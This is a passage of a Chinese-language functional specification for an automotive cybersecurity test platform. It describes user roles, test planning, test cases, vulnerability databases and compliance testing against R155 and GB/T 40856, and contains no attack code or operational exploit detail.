提供了与平台交互的能力，扩展了平台的使用场景。</p><p>检测平台的界面设计要求用户友好，提供清晰的提示和合理的布局。操作逻辑应该简单直观，以便用户可以轻松地完成任务，而流畅的用户体验则确保了用户可以高效地使用平台。</p><p>平台审计功能提供了生成审计结果记录的能力，这对于确保平台的安全性和合规性至关重要。审计记录可以帮助组织追踪关键操作，进行风险评估，以及在必要时进行问题追溯。</p><p>统计功能提供了强大的数据分析工具，包括统计图的展示和导出。用户可以选择不同的统计项进行分析，如用例统计，缺陷统计，合规检测统计等。筛选功能则允许用户根据特定的标准对数据进行过滤，以便更加精确地分析测试结果。</p><p>漏洞库管理功能提供了一系列工具，以支持漏洞信息的管理和更新。离线更新功能确保了漏洞库始终保持最新状态，即使在没有网络连接的情况下也是如此。搜索和查看功能则允许用户快速找到特定的漏洞信息，以便进行分析或采取相应的措施。</p><h4 id="技术实现内容-18"><a href="#技术实现内容-18" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h5><ol><li>权限划分</li></ol><p>系统管理员拥有最高权限，可以管理用户、角色、审批和审计等功能。管理员可以创建和管理不同角色，并为每个角色分配相应的权限。权限可以细分为模块级别或功能级别，以控制用户对系统各个功能的访问权限。</p><ol><li>用户管理</li></ol><p>管理员可以创建、编辑和删除用户账号。用户账号包括基本信息（如用户名、密码、邮箱等）和角色信息。管理员可以为用户分配角色，控制用户在系统中的权限。用户可以使用工作邮箱注册账户，注册审核功能确保新用户的身份验证，并通过邮件通知审核结果。支持用户账号的禁用和启用操作。用户支持修改、重置自己用户登录密码，密码密文传出</p><ol><li>角色管理</li></ol><p>管理员可以创建、编辑和删除角色。支持角色的禁用和启用操作。<br>角色定义了一组权限，用于控制用户对系统功能的访问。每个角色可以包含多个权限，可以根据实际需求进行灵活配置5种角色权限，支持自定义角色（实验室负责人/测试接口人/测试执行人/三方服务人员/审计人员）</p><p>实验室负责人的职责：</p><p>创建测试车型和相关测试任务。</p><p>分配测试专业接口人，并生成审核列表。</p><p>管理待审核内容，并支持查询、审批、查看详情和驳回等操作。</p><p>查看测试人员和整体测试状态与进展。</p><p>测试专业接口人的职责：</p><p>接收并管理车型测试任务，包括邮件通知。</p><p>制定和上传测试计划、规范文件和需求文件。</p><p>分配权限给相关用户，发送邮件通知测试人员。</p><p>提交测试计划至上级审批，并查看测试状态与进展。</p><p>测试执行人的职责：</p><p>接收具体测试项任务，并能提出修改测试计划的建议。</p><p>确认并提交测试计划至上级审批。</p><p>执行测试任务，并创建与三方服务人员关联的任务。</p><p>三方服务人员的权限：</p><p>限定于车型测试相关工作的访问权限</p><ol><li>审批功能</li></ol><p>支持审批流程的自定义审批节点模板功能，并支持应用在不同模块的审批流程中，用于处理系统中的审批事务。管理员可以创建、编辑和删除审批流程，并指定参与审批的角色。审批流程可以包括多个审批节点，每个节点可以指定审批人员和审批条件。支持审批记录的查看和审批状态的跟踪。审批支持向相关用户发送电子邮件。</p><ol><li>审计功能</li></ol><p>系统会记录用户的操作日志和系统事件，用于审计和追踪用户行为。记录的信息包括记录用户的操作日志，包括登录、计划制定、任务创建、执行、漏洞信息编写等等。管理员可以查看和导出审计日志，支持多维度筛选条件，如时间、任务、车型、测试人等，以便于查看和审计日志</p><ol><li>升级功能</li></ol><p>显示系统升级的历史记录，包括版本号、状态、类型、时间和内容，升级内容存放于升级包中，并在升级过程中记录显示。</p><p>这些功能设计将确保智能汽车网络靶场检测平台能够高效、安全地管理用户权限、审核和审计过程，同时提供灵活的工作流程以适应不同的测试需求。每个功能都应该有一个用户友好的界面，以便于操作，并保证数据安全和隐私。</p><h5 id="车型管理"><a href="#车型管理" class="headerlink" title="车型管理"></a>车型管理</h5><p>车型管理功能描述</p><ol><li>管理测试车型</li></ol><p>支持创建、编辑和删除测试车型的信息。测试车型信息包括车型名称、描述、版本等。可以为每个测试车型指定相关的控制器和测试项。</p><ol><li>管理通用控制器</li></ol><p>支持创建、编辑和删除通用控制器的信息。通用控制器是用于测试车型的硬件设备，如ECU（电子控制单元）。控制器信息包括名称、型号、供应商等。</p><ol><li>管理通用测试项</li></ol><p>支持创建、编辑和删除通用测试项的信息。通用测试项是用于测试车型的功能和网络测试。测试项可以包括测试功能（如加速度、制动等）和测试网络（如CAN总线、以太网等）。</p><ol><li>设置相关车型接口人</li></ol><p>支持为每个测试车型指定相关的接口人。接口人负责与车型相关的沟通和协调工作。可以设置接口人的联系信息，方便沟通和协作。</p><ol><li>需求文档管理</li></ol><p>支持上传、下载和管理与测试车型相关的需求文档。需求文档可以包括车型规格、功能要求、性能要求等。管理员和相关人员可以查看和更新需求文档。</p><ol><li>整体测试进度和测试内容规划</li></ol><p>支持对车型进行整体测试进度和测试内容的规划。可以设定测试计划、测试阶段和测试任务。管理员和相关人员可以查看和更新测试进度和测试内容。</p><ol><li>统计功能</li></ol><p>支持对车型测试数据进行统计和分析。可以生成测试报告、测试指标图表和统计数据。管理员和相关人员可以查看和导出统计结果。</p><h5 id="计划管理"><a href="#计划管理" class="headerlink" title="计划管理"></a>计划管理</h5><p>计划管理功能描述：</p><ol><li>分权限展示计划内容</li></ol><p>根据用户权限的不同，系统会展示相应的计划内容。管理员可以查看、编辑和删除所有计划。普通测试人员只能查看和编辑自己负责的计划。</p><ol><li>规划测试项的具体测试时间</li></ol><p>测试人员可以在计划中为每个测试项指定具体的测试时间。可以设定开始时间、结束时间和持续时间等。支持设置测试项的优先级和重要性，以便进行合理的时间规划。</p><ol><li>统计功能</li></ol><p>提供统计功能，用于分析和展示计划的统计信息。可以统计不同状态的计划数量，如已完成、进行中、未开始等。支持生成图表和报表，以便更直观地了解计划的执行情况。</p><ol><li>审核功能</li></ol><p>支持计划的审核流程，确保计划的合理性和准确性。管理员可以审核计划，并进行批准或拒绝操作。审核记录会被记录下来，以便追溯和审计。</p><h5 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h5><p>任务管理功能描述：</p><ol><li>创建测试任务</li></ol><p>根据测试计划， 支持创建手动测试任务（比如硬件测试：按照定义用例步骤上传图片）选择自定义用例执行时根据用例步骤上传执行过程图片、log等。可以创建针对每个测试项的测试任务。每个测试任务包括测试项名称、测试人员、开始时间、结束时间等信息。可以将测试任务分配给指定的测试人员进行执行。</p><ol><li>测试任务执行</li></ol><p>支持管理不同测试任务的执行状态和进度。可以同时执行多个测试任务，实现并行测试。管理员可以监控测试任务的执行情况，并进行必要的调整和协调。</p><ol><li>状态查询</li></ol><p>可以查看每个测试任务的相关测试需求和所需的工具占用情况。</p><p>显示测试任务的当前状态，如进行中、已完成等。</p><ol><li>执行状态</li></ol><p>展示测试任务的等待序列，即等待执行的任务列表。实时展示测试任务的执行状态比如用例的执行进度和结果，包括开始时间、结束时间和进度等。</p><ol><li>用例详情</li></ol><p>提供每个测试任务中用例的详细信息，包括测试步骤、需求和预期结果。可以查看和编辑用例的具体内容，方便测试人员进行测试执行。</p><ol><li>漏洞生成</li></ol><p>当测试任务中的某个用例执行失败时，系统可以自动生成相应的漏洞记录。漏洞记录包括用例名称、失败原因和建议修复措施等信息。</p><ol><li>测试结果管理</li></ol><p>任务执行完成，支持展示测试结果，下载报告、log、测试用例（包含步骤）测试计划内容等文件包。支持显示每个测试任务的测试结果，包括通过、失败和未执行等状态。管理员可以对测试结果进行管理，如标记为已复查、重新执行等操作。</p><ol><li>结果下载</li></ol><p>提供下载功能，可以下载测试报告、用例、测试内容计划等相关文档。方便用户查阅和分享测试相关的文档和报告。</p><ol><li>统计功能：</li></ol><p>提供统计功能，用于分析和展示测试任务的统计信息。可以统计不同状态的测试任务数量，如已完成、进行中、未开始等。支持生成图表和报表，以便更直观地了解测试任务的执行情况。</p><h5 id="用例管理"><a href="#用例管理" class="headerlink" title="用例管理"></a>用例管理</h5><p>用例管理功能描述：</p><ol><li>用例总览和分类展示</li></ol><p>提供用例总览页面，展示所有的测试用例。支持测试用例自定义编写、分类查询、添加、删除、修改等功能。支持按分类进行展示，如功能分类、网络分类等。用户可以根据需要选择特定的分类进行查看和管理，包括支持关联测试项，并按照测试项分类。 测试用例统一管理，可按类型、测试方向等条件筛选，显示审批状态和引用次数等统计信息。</p><ol><li>编辑测试用例</li></ol><p>用户可以编辑测试用例，包括用例名称、描述、前置条件、测试步骤和预期结果等信息。支持对测试步骤进行编辑，包括添加、删除和修改步骤。用户可以根据实际需求灵活地编辑测试用例的内容。方便自动化测试脚本开发及测试执行调用。测试用例步骤编写以及能在结果中结果展示分为自动化测试用例（调用工具）和手动添加测试用例。</p><ol><li>关联测试需求</li></ol><p>支持将测试用例与相关的测试需求进行关联。支持为指定的待测试设备或者测试方向，应用特定的测试用例，极大程度增加实际操作情景的便利性。用户可以在用例管理界面选择关联的测试需求，以便更好地跟踪和管理测试用例的执行情况。测试用例编写支持关联需求文档，需求类别、编号等。执行该用例的测试任务可查看关联的需求文档，和需求编号等信息。</p><ol><li>统计功能</li></ol><p>提供统计功能，用于分析和展示测试用例的统计信息。可以统计不同分类的用例数量，如功能用例、网络用例等。支持生成图表和报表，以便更直观地了解用例的分布和执行情况。支持上传用例模板，支持按照模板格式下载测试用例。</p><ol><li>审核功能</li></ol><p>支持测试用例的审核流程，确保用例的准确性和可执行性。管理员可以审核用例，并进行批准或拒绝操作。审核记录会被记录下来，以便追溯和审计。定制的测试用例具有编写、试用、发布等状态。支持审核功能，提交到实验室负责人角色进行审核，审核后即可更新到关联模块中。</p><ol><li>管理功能</li></ol><p>提供管理功能，用户可以对测试用例进行管理操作。包括创建、编辑、删除用例等操作。管理员可以管理所有用例，普通用户只能管理自己创建的用例。</p><ol><li>通用测试项（功能、网络）管理</li></ol><p>支持管理通用测试项，如功能测试项和网络测试项等。用户可以创建和编辑通用测试项，以便在用例中进行引用和关联。通用测试项的管理可以提高用例的复用性和效率。</p><h5 id="结果管理"><a href="#结果管理" class="headerlink" title="结果管理"></a>结果管理</h5><p>结果管理功能描述：</p><ol><li>测试结果总览</li></ol><p>提供测试结果总览页面，展示所有的测试结果。用户可以查看不同测试任务的测试结果，包括通过、失败和未执行跳过等状态。</p><ol><li>结果详情展示</li></ol><p>用户可以查看每个测试结果的详细信息。结果详情包括测试用例名称、执行状态、失败原因和建议修复措施等内容。用户可以通过结果详情了解每个测试用例的执行情况和问题。</p><ol><li>管理功能</li></ol><p>提供管理功能，用户可以对测试结果进行管理操作。包括标记为已复查、重新执行、关闭等操作。管理员可以管理所有测试结果，普通用户只能管理自己相关的测试结果。</p><ol><li>统计功能</li></ol><p>提供统计功能，用于分析和展示测试结果的统计信息。可以统计不同状态的测试结果数量，如通过、失败和未执行等。支持生成图表和报表，以便更直观地了解测试结果的分布和趋势。</p><ol><li>单个任务测试结果展示</li></ol><p>结果管理功能可以与任务管理功能进行集成。在任务管理界面，用户可以查看每个测试任务的单独测试结果。这样可以方便用户从任务的角度查看和管理测试结果。</p><p>针对汽车信息安全测试，结果管理功能可以帮助用户对测试结果进行全面的管理和分析。提供测试结果总览和详情展示，方便用户查看每个测试用例的执行情况和问题。支持管理功能，用户可以对测试结果进行标记和操作。统计功能可以帮助用户了解测试结果的整体情况和趋势。同时，结果管理功能与任务管理功能的集成可以提供更便捷的测试结果展示和管理体验。</p><h5 id="工具管理"><a href="#工具管理" class="headerlink" title="工具管理"></a>工具管理</h5><p>工具管理功能描述：</p><ol><li>工具接入权限管理</li></ol><p>提供对工具接入权限的管理功能。管理员可以配置哪些用户或角色可以访问和使用特定的工具。用户可以查看和配置自己的工具接入权限。提供一个向导或表单，允许用户添加新工具和配置其连接设置。这包括输入工具的基本信息、版本、描述以及任何必要的连接参数。</p><ol><li>工具使用记录</li></ol><p>记录每个用户对工具的使用情况。包括使用时间、使用工具、使用目的等信息。用户可以查看自己的工具使用记录，管理员可以查看所有用户的记录包括已接入和未接入的工具以及工具的版本和描述；。</p><ol><li>工具状态展示</li></ol><p>提供工具占用状态的展示功能。用户可以查看工具的当前占用情况，包括是否被占用、占用者和占用时间等信息。这样可以避免多个用户同时占用同一个工具的情况。实现一个状态监测系统，用于实时更新工具的在线或离线状态。在用户界面上，为每个工具显示当前状态（在线/离线）。未启动的工具在界面上标记为离线状态。若工具处于离线状态，其相关的任务在用户界面上标记为不可执行，并提供相应提示。</p><ol><li>内置工具说明文件</li></ol><p>提供内置工具说明文件，包含每个工具的详细说明和使用方法。用户可以查看工具的说明文件，以便了解工具的功能和使用方式。这样可以帮助用户更好地使用和配置工具。</p><ol><li>调用API</li></ol><p>支持通过API调用工具管理功能。用户可以通过API进行工具接入权限的配置、工具使用记录的查询等操作。这样可以方便集成工具管理功能到其他系统或工具中。</p><ol><li>统计功能</li></ol><p>提供使用统计功能，用于分析收集和展示工具的使用频率、使用时长、错误率、使用者分布等信息。支持生成图表和报表，以便更直观地了解工具的使用情况。</p><p>通过以上工具管理功能，用户可以方便地管理和配置工具的接入权限，查看工具使用记录和占用状态。提供内置工具说明文件，帮助用户了解工具的功能和使用方法。支持通过API调用工具管理功能，方便集成到其他系统或工具中。同时，使用统计功能可以帮助用户了解工具的使用情况和趋势，以便进行优化和调整。</p><h5 id="知识库管理"><a href="#知识库管理" class="headerlink" title="知识库管理"></a>知识库管理</h5><p>知识库管理功能描述：</p><ol><li>自定义文件结构</li></ol><p>提供自定义的文件结构，用户可以根据需要创建文件夹和文件，组织知识库的内容。用户可以创建多层级的文件夹，以便更好地分类和管理知识库的文档。实现一个文件管理系统，用于上传、存储和管理资料文件。支持的文件类型应包括文档、PDF、图片等。允许用户上传系统整体介绍、软件使用说明等文件实现下载功能，允许用户下载已上传的文件。提供删除功能，允许用户删除不再需要的文件。应确保所有文件传输过程中的安全性，防止数据泄露。</p><ol><li>导入文档</li></ol><p>支持导入漏洞积累和漏洞利用方面的文档。用户可以将已有的漏洞文档导入到知识库中，以便来存储、管理和分享关于入侵检测与防御测试系统的重要资料和知识。</p><ol><li>编辑文档</li></ol><p>提供文档编辑功能，用户可以在知识库中创建和编辑文档。用户可以使用富文本编辑器，对文档进行格式化和排版，以便更好地呈现内容。允许用户创建自定义的文件目录结构，以便于组织和管理文件。支持创建多级目录，以适应复杂的文件组织需求。提供拖放界面，使得用户可以方便地移动文件到不同的目录。目录结构应该可视化，允许用户一目了然地看到文件的组织方式。</p><p>提供一个文本编辑器，支持富文本编辑，允许用户编辑和格式化文本。编辑器支持在文本中插入图片，以丰富漏洞利用方法的描述。允许用户保存和更新编辑好的知识内容。提供搜索功能，便于用户检索特定的知识条目。支持在文档中添加图片。用户可以上传图片文件，并将其插入到文档中，以便更直观地展示内容。</p><ol><li>上传附件</li></ol><p>支持上传附件文件到知识库中。用户可以上传各种类型的附件文件，如PDF、Word文档、压缩包等。这样可以将相关的文件和文档整合在一起，方便用户查看和下载。</p><p>通过以上知识库管理功能，用户可以自定义文件结构，灵活组织知识库的内容。支持导入漏洞积累和漏洞利用文档，方便用户管理和共享相关的知识。提供文档编辑功能，支持富文本编辑和格式化排版，以便更好地呈现内容。用户可以在文档中添加图片，增强内容的可视化效果。同时，支持上传附件文件，将相关文件和文档整合在一起，方便用户查看和下载。这些功能能够有效地管理和利用知识库的内容，提高信息的共享和利用效率。</p><h5 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h5><p>漏洞管理功能描述：</p><ol><li>靶场漏洞数据库离线更新</li></ol><p>支持离线更新靶场漏洞数据库，确保漏洞信息的及时性和准确性。用户可以下载最新的漏洞数据库文件，并进行更新操作。</p><ol><li>车型漏洞管理</li></ol><p>支持按车型分类管理漏洞，在漏洞库界面上提供排序功能，可以根据漏洞等级进行升序或降序排序实现一个搜索功能，提供漏洞等级的筛选器，以便用户可以根据等级查找漏洞。定期从漏洞扫描工具获取最新的漏洞库信息，保持数据的时效性。为车型相关的缺陷信息设计一个单独的数据库或数据表。显示的信息包括：发现日期、缺陷描述、关联车型、零部件等方便用户根据车型进行漏洞管理和查询。用户可以创建车型分类，并将相关漏洞进行关联和管理。</p><ol><li>漏洞导入和导出</li></ol><p>设计一个API接口，允许外部系统或工具调用，获取漏洞库信息。该接口应当提供必要的认证和授权机制，确保数据的安全。支持漏洞的导入和导出功能，方便用户进行数据迁移和共享。用户可以导入漏洞数据文件，将漏洞信息快速导入到系统中。同样，用户也可以将漏洞数据导出为文件，以便在其他系统或工具中使用。</p><ol><li>任务自动生成</li></ol><p>支持自动生成任务，根据漏洞信息自动创建相关的测试任务。用户可以选择特定的漏洞，系统将自动创建相应的测试任务，提高测试效率。</p><ol><li>漏洞合并</li></ol><p>支持合并相同的漏洞，避免重复管理和测试。当系统检测到相同的漏洞时，用户可以选择合并这些漏洞，以减少冗余的管理和测试工作。</p><ol><li>漏洞来源展示</li></ol><p>提供漏洞来源的展示功能，用户可以了解每个漏洞的来源信息。漏洞信息至少包括：CVE编号、CNNVD编号、漏洞名称、影响版本、影响模块、漏洞等级，允许用户通过漏洞编号、名称进行模糊查询。这样可以帮助用户更好地追踪和分析漏洞的产生原因和传播途径。</p><ol><li>自动CVSS3.0评分计算</li></ol><p>支持自动计算漏洞的CVSS3.0评分，以评估漏洞的严重程度。用户可以查看每个漏洞的CVSS3.0评分，以便进行风险评估和优先级排序。</p><ol><li>展示步骤和FAIL项附件</li></ol><p>支持展示漏洞的测试步骤和在报告中体现FAIL项附件。用户可以查看每个漏洞的测试步骤，以便了解漏洞的验证过程。在报告中，可以将FAIL项的附件直接关联到漏洞，以提供更详细的信息。</p><ol><li>管理功能和统计功能</li></ol><p>提供漏洞管理功能，包括添加、编辑、删除漏洞等操作。车型缺陷管理数据支持两种数据来源：平台测试产生的缺陷和手动导入的excel缺陷信息。允许手动删除数据条目。平台自产生的数据可以通过回归测试结果自动删除。支持统计功能，可以统计漏洞的数量、分类、状态等信息，以便进行分析和报告。</p><ol><li>知识库导出文档</li></ol><p>支持将漏洞利用文档导出到知识库，方便共享和管理。用户可以选择特定的漏洞利用文档，将其导出到知识库中，便于后续的利用和参考</p><ol><li>在线编辑漏洞利用文档</li></ol><p>支持在线编辑漏洞利用文档，用户可以直接在系统中进行编辑和更新。提供富文本编辑器，支持格式化和排版功能，以便更好地呈现和编辑文档内容。</p><p>通过以上漏洞管理功能，用户可以灵活管理靶场漏洞数据库，按车型分类进行漏洞管理。支持漏洞的导入和导出，以及自动生成相关测试任务。用户可以合并相同的漏洞，减少冗余的管理和测试工作。展示漏洞来源，自动计算CVSS3.0评分，展示测试步骤和在报告中体现FAIL项附件，提供详细的信息。支持管理功能和统计功能，方便用户进行漏洞管理和分析。同时，支持向知识库导出利用文档，并提供在线编辑漏洞利用文档的功能，方便用户共享和更新漏洞利用信息。这些功能能够有效地管理和利用漏洞信息，提高安全测试和漏洞利用的效率。</p><h5 id="首页管理"><a href="#首页管理" class="headerlink" title="首页管理"></a>首页管理</h5><p>首页管理功能描述：</p><ol><li>多入口支持</li></ol><p>主页提供多个入口选项，以便用户快速访问不同的功能和模块。用户可以根据自己的需求和权限，选择进入相应的功能页面。</p><ol><li>展示模块选择</li></ol><p>支持选择展示模块，用户可以根据自己的关注点和需求，自定义主页展示的模块内容。用户可以选择需要展示的模块，例如任务管理、漏洞管理、报告统计等，以便快速查看相关信息</p><ol><li>统计功能支持</li></ol><p>主页提供统计功能，可以展示各种数据和指标的统计信息。用户可以查看任务数量、漏洞数量、报告完成率等统计数据，以便进行数据分析和监控。</p><ol><li>切换展示统计图和车型拓扑图</li></ol><p>支持切换展示不同类型的统计图和车型拓扑图。用户可以选择展示柱状图、折线图、饼图等不同形式的统计图，以便更直观地呈现数据。同时，用户也可以切换展示车型拓扑图，以了解车型之间的关系和拓扑结构。</p><ol><li>快捷入口</li></ol><p>主页提供快捷入口，方便用户快速访问常用的功能和页面。用户可以将常用的功能或页面添加到快捷入口，以便一键访问，提高操作效率。</p><h5 id="车型测试综合业务管理"><a href="#车型测试综合业务管理" class="headerlink" title="车型测试综合业务管理"></a>车型测试综合业务管理</h5><ol><li>多维度条件查询</li></ol><p>提供强大的搜索引擎，支持基于多个字段和条件的综合查询。</p><ol><li>添加数据，</li></ol><p>提供用户友好的界面和工具，用于快速添加新数据。</p><ol><li>关联数据联动修改和删除</li></ol><p>实现数据关联性检查，确保在修改或删除数据时，相关联的数据能够同步更新或提示用户进行确认。提供事务性操作，保证数据操作的原子性，避免数据不一致。</p><h5 id="全面的文档管理"><a href="#全面的文档管理" class="headerlink" title="全面的文档管理"></a>全面的文档管理</h5><ol><li>文件的分享权限分配</li></ol><p>实现文档的分享功能，允许用户将文档分享给其他用户或用户组。提供细粒度的权限分配，包括查看权限、编辑权限、下载权限等。确保敏感文档的安全性，通过权限控制限制对敏感信息的访问。</p><ol><li>自定义文件夹管理不同类型文档</li></ol><p>允许用户创建自定义文件夹来组织文档。支持按文档类型、、部门等多种方式分类管理文档。</p><ol><li>文档预览</li></ol><p>实现在线文档预览功能，使用户无需下载即可查看文档内容。支持常见的基础文档类型预览，如合规文档、基础规范文档等</p><h5 id="对外提供测试数据和接入"><a href="#对外提供测试数据和接入" class="headerlink" title="对外提供测试数据和接入"></a>对外提供测试数据和接入</h5><ol><li>输出API接口文档</li></ol><p>API文档应详细描述每个接口的功能、请求方法、请求参数、请求示例、响应结构、响应示例、错误码等。每个请求和响应的字段都应有清晰的说明，包括字段名、字段含义、数据类型、是否必填、默认值等。对于每个参数，明确其数据类型（如字符串、整数、布尔值等）和取值范围或允许的值列表。API文档应包含版本信息，以便用户了解当前API的版本，并在API更新时做出相应的调整。</p><ol><li>配置允许的请求源接入</li></ol><p>平台支持CORS配置，允许指定的域名进行跨域请求。实施IP或域名白名单制度，只有列入白名单的请求源才能访问API接口。A提供API密钥或令牌，以便验证请求源的合法性。为了防止滥用，可以对API接口调用频率进行限制。</p><h5 id="审计功能"><a href="#审计功能" class="headerlink" title="审计功能"></a>审计功能</h5><ol><li>审计日志记录</li></ol><p>系统应自动记录所有关键操作和事件，包括用户登录/登出、数据访问、数据修改、系统设置更改、权限修改等。审计日志应包含操作时间、操作用户、操作类型、操作对象、操作结果以及操作前后的关键数据快照（如果适用）</p><h5 id="统计功能"><a href="#统计功能" class="headerlink" title="统计功能"></a>统计功能</h5><p>统计功能描述：</p><ol><li>统计图展示</li></ol><p>支持以直观的图表形式展示统计数据，如柱状图、折线图、饼图等。用户可以通过统计图快速了解数据的分布、趋势和比例等信息。</p><ol><li>统计图导出</li></ol><p>支持将统计图导出为常见的文件格式，如图片、PDF等。用户可以将统计图导出保存，以便在报告、演示或与他人共享时使用。</p><ol><li>选择统计项</li></ol><p>提供灵活的统计项选择，用户可以根据需要选择统计的具体项。统计项可以包括用例统计、缺陷统计、合规检测统计等，用户可以根据具体场景进行选择。</p><ol><li>筛选功能</li></ol><p>支持根据特定条件进行数据筛选，以便更精确地统计和分析数据。用户可以根据需要选择筛选条件，如时间范围、车型、漏洞类型等，以获取所需的统计结果。</p><p>通过以上统计功能，用户可以以直观的图表形式展示统计数据，快速了解数据的分布和趋势。支持将统计图导出为常见的文件格式，方便在报告、演示或与他人共享时使用。用户可以灵活选择统计项，根据具体场景进行统计分析。同时，提供筛选功能，用户可以根据特定条件进行数据筛选，以获取所需的统计结果。这些功能能够帮助用户更好地理解和分析数据，支持决策和优化工作流程。</p><h3 id="测试能力"><a href="#测试能力" class="headerlink" title="测试能力"></a>测试能力</h3><p>测试管理平台围绕业务领域将业务划分为管理业务与测试业务，并将不同业务分散到不同的微服务中，从而降低系统的耦合性，并提供更加灵活的服务支持。</p><h4 id="功能实施方案-24"><a href="#功能实施方案-24" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>平台提供了全面的合规测试支持，不仅能够对整车的安全性能进行全面检测，也可以对车辆的各个零部件进行详尽的合规性测试。这意味着从发动机到车灯，从制动系统到车载信息娱乐系统，每一个部件都将接受严格的安全合规评估。这样的测试保证了车辆在设计和制造过程中遵守了所有相关的安全标准和法规，确保了最终产品的安全性和可靠性。</li><li>平台支持多维度的测试场景，特别是根据国内外的安全标准，如R155/GBT-40856等，进行专项测试。这样的设计使得平台能够适应多变的法规要求，为车辆在全球市场的合规性提供了强有力的支持。无论是国际市场的安全要求，还是国内市场的特殊规定，平台都能提供对应的测试场景，确保车辆符合所有必要的安全标准。</li><li>漏洞检测：支持提供每个漏洞项的详细描述及影响版本，漏洞等级已分级（低危、中危、高危、严重等），方便确认并完成修复。</li><li>平台支持以安全测试项为维度的测试场景，涵盖硬件安全、数据安全、系统安全、软件安全和协议安全等多个方面。这使得安全测试能够全面覆盖车辆的每一个安全维度，确保每个环节都不会成为潜在的安全风险点。通过这样细致的分类，测试人员可以更有针对性地设计测试用例，提高测试的有效性和效率。</li><li>平台支持以功能为维度的测试场景，允许测试人员根据车辆的具体功能进行定制化的测试。这种测试方法不仅关注车辆的整体性能，也关注每个功能模块的细节表现，确保车辆的每个功能都能达到预期的性能标准，同时也符合安全要求。</li><li>平台支持对包括蓝牙协议、GNSS（GPS）协议、WIFI 协议在内的各种硬件检测设备进行测试。这意味着测试人员可以评估车辆在通信和定位方面的性能和安全性，确保车辆在这些关键技术领域的可靠性和抗干扰能力。</li><li>平台提供了风险点权重管理功能，允许测试人员根据测试结果重新分配风险点的权重。这种灵活的权重管理机制使得测试团队可以根据最新的安全情报和测试数据，调整测试重点，优化测试资源的分配。</li><li>平台支持全面的自动化测试功能，包括固件自动拉取检测和二进制与应用漏洞检测等。自动化测试能够大幅提升测试效率，减少人为错误，同时确保在整个测试过程中能够持续、一致地执行测试用例。</li><li>平台还支持详细流程化的半自动化测试功能，如GNSS欺骗测试和蓝牙欺骗测试等。这些半自动化的测试功能结合了自动化测试的效率和手动测试的灵活性，使测试人员能够更加精确地模拟和评估复杂的攻击场景。</li><li>对于那些无法通过自动化或半自动化方式进行的测试，平台提供了简洁合理的引导测试功能。这些引导测试通过提供清晰的步骤和指导，帮助测试人员完成复杂的测试任务，确保即使是最难以模拟的测试场景也能得到充分的评估。</li><li>平台支持灵活的三方测试接入功能，允许测试人员根据测试模块协议自定义适配三方测试工具，并将这些工具集成到平台中。这意味着无论是市面上的标准测试工具还是特定的定制工具，都可以与平台无缝对接，为用户提供更加丰富和全面的测试能力。</li></ol><h4 id="技术实现内容-19"><a href="#技术实现内容-19" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="标准测试"><a href="#标准测试" class="headerlink" title="标准测试"></a>标准测试</h5><p>汽车信息安全检测平台具备满足R155及GBT-40856标准的整车及零部件的合规测试能力。以下是对该能力的描述：</p><ol><li>R155标准测试能力</li></ol><p>R155是一项重要的汽车信息安全标准，要求对整车和零部件进行安全性评估和测试。平台提供了全面的R155标准测试能力，能够对整车和各个零部件进行合规性测试和评估。通过平台，用户可以进行必要的测试和分析，以确保汽车系统满足R155标准的安全要求。</p><ol><li>GBT-40856标准测试能力</li></ol><p>GBT-40856是中国国家标准，涵盖了汽车信息安全的技术要求和测试方法。平台具备满足GBT-40856标准的整车及零部件的合规测试能力。用户可以利用平台进行GBT-40856标准的测试，以验证汽车系统的安全性和合规性。</p><ol><li>整车合规测试能力</li></ol><p>平台支持对整车进行合规性测试，包括对整车系统的安全性评估和漏洞扫描。用户可以通过平台执行全面的整车测试，以确保整车系统满足相关的安全标准和要求。</p><ol><li>零部件合规测试能力</li></ol><p>平台还提供了针对零部件的合规性测试能力。用户可以通过平台对各个零部件进行测试和评估，以确保它们符合相关的安全标准和要求。</p><p>通过汽车信息安全检测平台，用户可以借助其满足R155及GBT-40856标准的整车及零部件的合规测试能力，对汽车系统进行全面的安全性评估和合规性测试。这将有助于确保汽车系统的安全性，并满足相关的安全标准和法规要求。</p><h5 id="漏洞检测能力"><a href="#漏洞检测能力" class="headerlink" title="漏洞检测能力"></a>漏洞检测能力</h5><p>漏洞检测功能提供了以下主要特点和描述：</p><ol><li>对于每个漏洞项，提供了详细的描述，包括漏洞的原理、攻击方式、可能的影响和潜在风险等信息。</li></ol><p>每个漏洞项还会指明受影响的软件、系统或版本范围，以帮助用户了解该漏洞可能存在的具体环境和范围。</p><ol><li>漏洞等级分级：对漏洞进行了等级分级，包括低危、中危、高危、严重等级。</li></ol><p>漏洞等级的分级基于漏洞的严重程度和潜在风险，帮助用户更好地了解漏洞的紧急性和优先级。</p><p>通过以上功能，漏洞检测能够提供以下服务：</p><p>用户可以通过平台查看每个漏洞项的详细描述，了解漏洞的原理、攻击方式和可能的影响。平台会明确指出受影响的软件、系统或版本范围，帮助用户了解漏洞可能存在的具体环境和范围。漏洞等级的分级将帮助用户评估漏洞的严重程度和潜在风险，并根据等级确定紧急性和优先级。用户可以根据漏洞的描述和等级信息，采取相应的补救措施和安全措施，以降低漏洞带来的风险。</p><p>通过漏洞检测功能，用户可以全面了解每个漏洞项的详细描述和影响版本，以及漏洞等级的分级。这将有助于用户及时采取措施修复漏洞，提高系统的安全性，并降低潜在风险。</p><h3 id="测试场景"><a href="#测试场景" class="headerlink" title="测试场景"></a>测试场景</h3><h4 id="功能实施方案-25"><a href="#功能实施方案-25" class="headerlink" 